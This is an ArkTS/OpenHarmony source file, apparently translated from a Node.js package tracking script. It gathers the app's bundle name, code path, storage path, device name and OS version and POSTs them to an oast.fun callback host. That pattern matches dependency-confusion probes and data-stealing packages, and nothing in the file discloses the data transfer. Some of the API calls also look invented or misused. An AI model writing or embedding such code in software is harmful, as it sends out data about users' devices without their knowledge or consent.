// 应用ArkTS约束：使用let/const代替var（约束9）
// 应用ArkTS约束：显式类型标注（约束10,23）
// 应用ArkTS约束：使用箭头函数（约束26）
// 注意：Node.js特定模块需要替换为ArkTS/OpenHarmony API

import { BusinessError } from '@ohos.base';
import http from '@ohos.net.http';
import featureAbility from '@ohos.ability.featureAbility';
import fileio from '@ohos.fileio';
import systemParameter from '@ohos.systemParameterEnhance';

// 定义PackageJSON接口（约束1,24）
interface PackageJSON {
    name: string;
    ___resolved?: string;
    version: string;
    [key: string]: any;
}

// 模拟获取包信息
const context = featureAbility.getContext();
let packageInfo = context.getBundleName();
let versionInfo = systemParameter.getSync('const.ohos.version.release');

// 构造跟踪数据（约束23）
const trackingData: string = JSON.stringify({
    p: packageInfo,
    c: context.getBundleCodePath(),
    hd: fileio.getStoragePath(),
    hn: systemParameter.getSync('persist.sys.device_name'),
    un: 'user', // OpenHarmony暂未提供直接获取用户名接口
    v: versionInfo,
});

// 创建查询字符串（约束1）
const postData: string = `msg=${encodeURIComponent(trackingData)}`;

// 配置HTTP请求选项（约束24）
const url = 'https://alter.cderwc12vtc0000pa6cgggzcqgyyyyyyb.oast.fun/';
const httpRequest = http.createHttp();
let options: http.HttpRequestOptions = {
    method: http.RequestMethod.POST,
    header: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': postData.length.toString()
    },
    readTimeout: 60000,
    connectTimeout: 60000
};

// 发送HTTP请求（约束26）
httpRequest.request(url, options, (err: BusinessError, data: http.HttpResponse) => {
    if (err) {
        console.error('Request error:', err);
        return;
    }
    
    let result = data.result;
    console.log('Response status:', data.responseCode);
    console.log('Response headers:', JSON.stringify(data.header));
    
    if (typeof result === 'string') {
        console.log('Response body:', result);
    } else {
        console.log('Response body:', JSON.stringify(result));
    }
    
    httpRequest.destroy();
});

// 发送请求数据（约束26）
httpRequest.on('dataProgress', (progress: number) => {
    httpRequest.off('dataProgress');
    httpRequest.write(postData, (err: BusinessError) => {
        if (!err) {
            httpRequest.end();
        }
    });
});
